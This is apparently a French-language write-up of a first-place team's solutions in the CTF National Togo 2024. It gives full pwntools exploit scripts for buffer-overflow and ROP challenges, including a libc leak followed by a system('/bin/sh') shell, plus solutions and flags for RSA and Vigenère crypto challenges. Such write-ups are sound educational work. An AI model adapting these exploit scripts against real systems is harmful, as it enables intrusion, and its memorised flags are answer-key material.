---
title: "CTF National Togo 2024: Writeup, 1st Place"
date: 2024-11-27 00:00:00 +0000
categories: [Writeups, CTF National Togo]
tags: [pwn, crypto, buffer-overflow, rsa, rop, aslr, pwntools, togo, first-place, first-blood]
image:
  path: /assets/images/wu-national-ctf/ctf-national-scoreboard-official.jpg
  alt: Scoreboard officiel CTF National Togo 2024
---

<img src="/assets/images/wu-national-ctf/ctf.png" alt="CTF National Togo 2024" style="border-radius: 10px; width: 100%;" />

J'ai participé au CTF National du Togo sous le pseudo de `3ss0w7r30u` avec ma team **n0_m3rcy_f0r_7h3m!!**.

<img src="/assets/images/wu-national-ctf/ctf-national-team-action.jpg" alt="L'équipe en action" style="border-radius: 10px; width: 100%;" />
*L'équipe n0_m3rcy_f0r_7h3m!! en pleine action pendant la compétition.*

<img src="/assets/images/wu-national-ctf/ctf-national-scoreboard-official.jpg" alt="Scoreboard officiel" style="border-radius: 10px; width: 100%;" />

Nous occupons la **première place: 5751 pts**, loin devant le 2ème (3851 pts).

> Pour les photos de l'événement et le prix remporté → [voir la page dédiée](/posts/togo-national-ctf/)

Avant de commencer, je tiens à remercier toute mon équipe, qui ont travaillé d'arrache-pied pour qu'on puisse occuper la première place. Mes remerciements vont particulièrement à l'ANCY et à la CDA sans oublier les créateurs de challenges (`Isid0r3`, `Sergio`, `H13ris`, `assa` et `44r0n_M3T4`).

Je commencerai avec les challenges **PWN** qui m'ont particulièrement intéressé. Je rappelle que j'ai fait un **First Blood 🩸** sur tous les challenges PWN qui ont été release. J'en suis particulièrement fier !

<img src="/assets/images/wu-national-ctf/pwn_challs.png" alt="PWN Challenges" style="border-radius: 10px; width: 100%;" />

**Challenges PWN :** isSet · isSet2 · ASLR · JumpMe · Baby_BoF

> Il s'agit d'un writeup, je ne tiens pas à faire un cours sur le PWN parce que je considère que c'est la compétence avec le plus de barrière à l'entrée parmi les types de challenges du format JEOPARDY. Il se peut donc que certaines notions vous paraissent floues si vous n'avez pas le minimum requis.

> Malheureusement toutes les instances ont été stoppées, donc les challenges seront résolus en local avec un fake flag : `FLAG{********FLAG-REDACTED********}`

---

## PWN

### isSet: First Blood 🩸

Le but principal d'un challenge PWN est d'exploiter des vulnérabilités liées à un binaire (exécutable) dans le but de détourner le programme de son but principal, et même obtenir un Shell distant.

La première des choses est de voir à quel type de binaire nous avons affaire :

<img src="/assets/images/wu-national-ctf/isset1.png" alt="file isSet" style="border-radius: 10px; width: 100%;" />

Il s'agit d'un **ELF 64 bits**, `dynamically linked`, `not stripped`, le binaire contient des symboles de débogage ce qui facilite grandement son analyse.

On vérifie les protections avec `checksec` :

<img src="/assets/images/wu-national-ctf/isSet-checksec.png" alt="checksec isSet" style="border-radius: 10px; width: 100%;" />

Deux protections actives :
- **NX enabled** : La stack n'est pas exécutable
- **PIE enabled** : Les adresses des fonctions sont randomisées à chaque exécution

Exécutons le binaire :

<img src="/assets/images/wu-national-ctf/isSet-execution.png" alt="Exécution isSet" style="border-radius: 10px; width: 100%;" />

On décompile avec **Ghidra** pour voir la fonction main :

<img src="/assets/images/wu-national-ctf/isSet-decomp.png" alt="Décompilation isSet" style="border-radius: 10px; width: 100%;" />

```c
undefined8 main(void)
{
  char local_3f8 [1000];
  long local_10;

  local_10 = 0;
  printf(&DAT_0010204c);
  gets(local_3f8);
  if (local_10 == 0x6465616462656566) {
    win();
  }
  else {
    printf("Pas de chance ! isset = 0x%lx\n",local_10);
  }
  return 0;
}
```

- Buffer `local_3f8` de 1000 bytes
- Variable `local_10` initialisée à 0
- `gets()` sans limitation → **buffer overflow**
- Si `local_10 == 0x6465616462656566` → appel de `win()`

La fonction `win()` :

<img src="/assets/images/wu-national-ctf/isSet-win.png" alt="win isSet" style="border-radius: 10px; width: 100%;" />
<img src="/assets/images/wu-national-ctf/isSet-win2.png" alt="win2 isSet" style="border-radius: 10px; width: 100%;" />

Elle affiche le flag. L'objectif : modifier `local_10` via le buffer overflow.

**Alignement en mémoire (stack) :**

<img src="/assets/images/wu-national-ctf/isSet-stack.png" alt="Stack isSet" style="border-radius: 10px; width: 100%;" />
<img src="/assets/images/wu-national-ctf/isSet-stack2.png" alt="Stack 2" style="border-radius: 10px; width: 100%;" />

Représentation visuelle :

<img src="/assets/images/wu-national-ctf/isSet-stack-canva.png" alt="Stack canva" style="border-radius: 10px; width: 100%;" />

On entre 5 "A" :

<img src="/assets/images/wu-national-ctf/isSet-AA.png" alt="isSet AA" style="border-radius: 10px; width: 100%;" />

<img src="/assets/images/wu-national-ctf/isSet-stack-canva2.png" alt="Stack canva 2" style="border-radius: 10px; width: 100%;" />

Notre but : remplir `local_3f8` pour déborder sur `local_10`.

<img src="/assets/images/wu-national-ctf/isSet-stack-canva3.png" alt="Stack canva 3" style="border-radius: 10px; width: 100%;" />
<img src="/assets/images/wu-national-ctf/isSet-stack-canva4.png" alt="Stack canva 4" style="border-radius: 10px; width: 100%;" />

**Calcul de l'offset :**

<img src="/assets/images/wu-national-ctf/isSet-stack3.png" alt="Stack 3" style="border-radius: 10px; width: 100%;" />

`0x3f8 - 0x10 = 1000` → offset de **1000 bytes**

**Solution terminal :**

```bash
python -c 'print("A"*1000 + "\x66\x65\x65\x62\x64\x61\x65\x64")' | ./isSet
# Bravo ! Vous avez appelé la fonction win() !
# FLAG{********FLAG-REDACTED********}
```

**Script pwntools :**

```python
from pwn import *

target = process("./isSet")
# target = remote("playground.ctf.tg", 1237)

offset = 1000
target.recvuntil(b"ne : ")

payload = b"A"*offset
payload += p64(0x6465616462656566)

target.sendline(payload)
target.interactive()
```

---

### isSet2: First Blood 🩸

<img src="/assets/images/wu-national-ctf/isSet2-file.png" alt="file isSet2" style="border-radius: 10px; width: 100%;" />
<img src="/assets/images/wu-national-ctf/isSet2-execution.png" alt="Exécution isSet2" style="border-radius: 10px; width: 100%;" />

```c
undefined8 main(void)
{
  char local_438 [1056];
  long local_18;
  long local_10;

  local_10 = 0;
  local_18 = 0x6465616463306465;
  printf(&DAT_0010204c);
  gets(local_438);
  if ((local_10 == 0x6465616462656566) && (local_18 != 0)) {
    win();
  }
  else {
    printf("Pas de chance ! isset = 0x%lx\n",local_10);
  }
  return 0;
}
```

Même logique que `isSet`, mais avec deux conditions. `local_18` est déjà différent de 0, il faut juste modifier `local_10`.

**Calcul de l'offset :**

<img src="/assets/images/wu-national-ctf/isSet2-offset.png" alt="isSet2 offset" style="border-radius: 10px; width: 100%;" />

`0x438 - 0x10 = 1064` → offset de **1064 bytes**

```bash
python -c 'print("A"*1064 + "\x66\x65\x65\x62\x64\x61\x65\x64")' | ./isSet2
# FLAG{********FLAG-REDACTED********}
```

---

### Baby_BoF: First Blood 🩸

```python
from pwn import *

target = process("Baby")
# target = remote("playground.ctf.tg", 1003)

offset = 76
target.recvuntil(b"something: ")

payload  = b"A"*offset
payload += p64(0xdeadbeef)

target.sendline(payload)
target.interactive()
```

```bash
python3 baby.py
# you have correctly got the variable to the right value
# Output: FLAG{********FLAG-REDACTED********}
```

---

### JumpMe: First Blood 🩸

Le seul à avoir résolu ce challenge: ROP chain pour appeler la fonction `win`.

```python
from pwn import *

target = process("./jump")

offset = 136
target.recvuntil(b"to go:")

ret = 0x000000000040101a  # ret;
win = 0x00000000004011d6  # win address;

payload  = b"A"*offset
payload += p64(ret)
payload += p64(win)

target.sendline(payload)
target.interactive()
```

```bash
python3 jump.py
# Here is your flag: FLAG{********FLAG-REDACTED********}
```

---

### ASLR: First Blood 🩸

Le seul à avoir résolu ce challenge. L'**ASLR** randomise l'emplacement des segments mémoire à chaque exécution, empêchant de prédire les adresses.

On dispose de trois fichiers : `aslr`, `libc.so.6`, `ld-2.35.so`. On patche le binaire avec `pwninit` :

```bash
./pwninit --bin aslr --ld ld-2.35.so --libc libc.so.6
```

**Fonction main → overflow() :**

```c
void overflow(void)
{
  char local_108 [256];

  memset(local_108,0,0x100);
  puts("Hey, Tell me a story!?\n");
  fflush(stdout);
  read(0,local_108,0x1000);  // buffer overflow !
  puts("The story says ");
  fflush(stdout);
  puts(local_108);
  return;
}
```

**Stratégie :** NX activé → pas de shellcode. On utilise une **ROP chain** pour :
1. Fuiter l'adresse de `puts` dans la libc → calculer la base de la libc
2. Construire un second payload avec `system('/bin/sh')`

> Propriété fondamentale : les offsets entre fonctions d'une même libc ne changent jamais, peu importe l'ASLR.

```python
from pwn import *

target = process('./aslr_patched')
elf = context.binary = ELF('./aslr_patched', checksec=False)
libc = elf.libc

target.recvuntil(b"story!?")

offset   = 264
pop_rdi  = 0x000000000040125b  # pop rdi; ret;
ret      = 0x0000000000401016  # ret;

# Payload 1 : leak adresse puts dans libc
payload  = b"A"*offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])

target.sendline(payload)
target.recvline(); target.recvline(); target.recvline(); target.recvline()

leak = unpack(target.recvline()[:6].ljust(8, b'\x00'))
info("Libc leak address : %#x", leak)
libc.address = leak - libc.sym['puts']
info("Libc base address : %#x", libc.address)

# Payload 2 : system('/bin/sh')
sh     = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

payload  = b"A"*offset
payload += p64(pop_rdi)
payload += p64(sh)
payload += p64(ret)
payload += p64(system)

target.sendline(payload)
target.interactive()
```

Résultat :

<img src="/assets/images/wu-national-ctf/ASLR.png" alt="ASLR pwned" style="border-radius: 10px; width: 100%;" />

---

## CRYPTO

**Challenges :** Encryptionvi · RSAvi · CribDrag

---

### Encryptionvi: Second Solve

Deux fichiers : `key-file.txt` et `cipher-file.txt`.

Contenu de `key-file.txt` :
```
n = 1000000016000000063
e = 23
c = 471055156725181012
```

RSA détecté → déchiffrement avec `dcode` :

<img src="/assets/images/wu-national-ctf/encryptionvi1.png" alt="encryptionvi1" style="border-radius: 10px; width: 100%;" />
<img src="/assets/images/wu-national-ctf/encryptionvi2.png" alt="encryptionvi2" style="border-radius: 10px; width: 100%;" />

On obtient : `104097099107101100`

Le cipher file est encodé plusieurs fois en **Base32** → décodage CyberChef :
```
UCVP{ORTI_MZPH_LNEBCSAIQXZL_SA}
```

La clé `104097099107101100` ressemble à de l'ASCII :

<img src="/assets/images/wu-national-ctf/encryptionvi3.png" alt="encryptionvi3" style="border-radius: 10px; width: 100%;" />
<img src="/assets/images/wu-national-ctf/encryptionvi4.png" alt="encryptionvi4" style="border-radius: 10px; width: 100%;" />

Bingo : `hacked` → déchiffrement **Vigenère** :

<img src="/assets/images/wu-national-ctf/encryptionvi5.png" alt="encryptionvi5" style="border-radius: 10px; width: 100%;" />

```
Flag : NCTF{KOMI_KPLE_ENCRYPTIONVI_LA}
```

---

### RSAvi: Second Solve

RSA avec `n` extrêmement grand → factorisation via **factordb** :

<img src="/assets/images/wu-national-ctf/RSAvi1.png" alt="RSAvi1" style="border-radius: 10px; width: 100%;" />
<img src="/assets/images/wu-national-ctf/RSAvi2.png" alt="RSAvi2" style="border-radius: 10px; width: 100%;" />

**64 facteurs premiers** → vulnérabilité RSA multi-prime.

```python
def inverse(x, m):
  a, b, u = 0, m, 1
  while x > 0:
    q = b // x
    x, a, b, u = b % x, u, x, a - q * u
  if b == 1:
    return a % m

n = 5028492424316659784848610571868499830635784588253436599431884204425304126574506051458282629520844349077718907065343861952658055912723193332988900049704385076586516440137002407618568563003151764276775720948938528351773075093802636408325577864234115127871390168096496816499360494036227508350983216047669122408034583867561383118909895952974973292619495653073541886055538702432092425858482003930575665792421982301721054750712657799039327522613062264704797422340254020326514065801221180376851065029216809710795296030568379075073865984532498070572310229403940699763425130520414160563102491810814915288755251220179858773367510455580835421154668619370583787024315600566549750956030977653030065606416521363336014610142446739352985652335981500656145027999377047563266566792989553932335258615049158885853966867137798471757467768769820421797075336546511982769835420524203920252434351263053140580327108189404503020910499228438500946012560331269890809392427093030932508389051070445428793625564099729529982492671019322403728879286539821165627370580739998221464217677185178817064155665872550466352067822943073454133105879256544996546945106521271564937390984619840428052621074566596529317714264401833493628083147272364024196348602285804117877
c = 910608573637151766592741646359139555904784321803428631903908521552777131951859943264846191932402055361498833375383031229982671149184931476945992913466889183135416918539956961820558514150083912697984734926228428443118777138784611695369848396345996684825978811495769794000028162328296106538834105679041143112167457232598415865376387117363685043296310893895276246811763099409354508200573619390090997964746798565329562050838200030630642311614753187518105030421307242611249224367001150700929649005704167426797306122940084457886648912809477865187453480840066041235665224721513474626323469389328348619076314546500324660002098406857368395712006506085979376605570852002827440581870285648568821111126184732646412744560252339729285745684255300564198233245551795520488002246541148191891638167766174343956597790791412271287103435898656125200311034726689604250470550962999602813441700239313471735088686090118193986040812649177699990431175510727928479609056957499981828555298181509942252598922669324311388997980627956686857171713789243776386582830964685489639326163726989990782553883048442851867799363438923802846660160105009546625127827041093314684740004973510575753396968680745019510035997596458456708393142128304479225924812035886211226
e = 65537

factors = ['9353689450544968301', '9431486459129385713', '9563871376496945939', '9734621099746950389', '9736426554597289187', '10035211751896066517', '10040518276351167659', '10181432127731860643', '10207091564737615283', '10435329529687076341', '10498390163702844413', '10795203922067072869', '11172074163972443279', '11177660664692929397', '11485099149552071347', '11616532426455948319', '11964233629849590781', '11992188644420662609', '12084363952563914161', '12264277362666379411', '12284357139600907033', '12726850839407946047', '13115347801685269351', '13330028326583914849', '13447718068162387333', '13554661643603143669', '13558122110214876367', '13579057804448354623', '13716062103239551021', '13789440402687036193', '13856162412093479449', '13857614679626144761', '14296909550165083981', '14302754311314161101', '14636284106789671351', '14764546515788021591', '14893589315557698913', '15067220807972526163', '15241351646164982941', '15407706505172751449', '15524931816063806341', '15525253577632484267', '15549005882626828981', '15687871802768704433', '15720375559558820789', '15734713257994215871', '15742065469952258753', '15861836139507191959', '16136191597900016651', '16154675571631982029', '16175693991682950929', '16418126406213832189', '16568399117655835211', '16618761350345493811', '16663643217910267123', '16750888032920189263', '16796967566363355967', '16842398522466619901', '17472599467110501143', '17616950931512191043', '17825248785173311981', '18268960885156297373', '18311624754015021467', '18415126952549973977']

phi = 1
for p in factors:
  p = int(p)
  phi *= (p - 1)

d = inverse(e, phi)
M = bytes.fromhex(hex(pow(c, d, n))[2:]).decode()
print(M)
```

```
Flag : NCTF{DegnigbaN_f3_RSAvi_Yelo}
```

---

### CribDrag: First Blood 🩸

Challenge CribDrag classique résolu avec l'outil `cribdrag`.

<img src="/assets/images/wu-national-ctf/cribdrag.png" alt="cribdrag" style="border-radius: 10px; width: 100%;" />
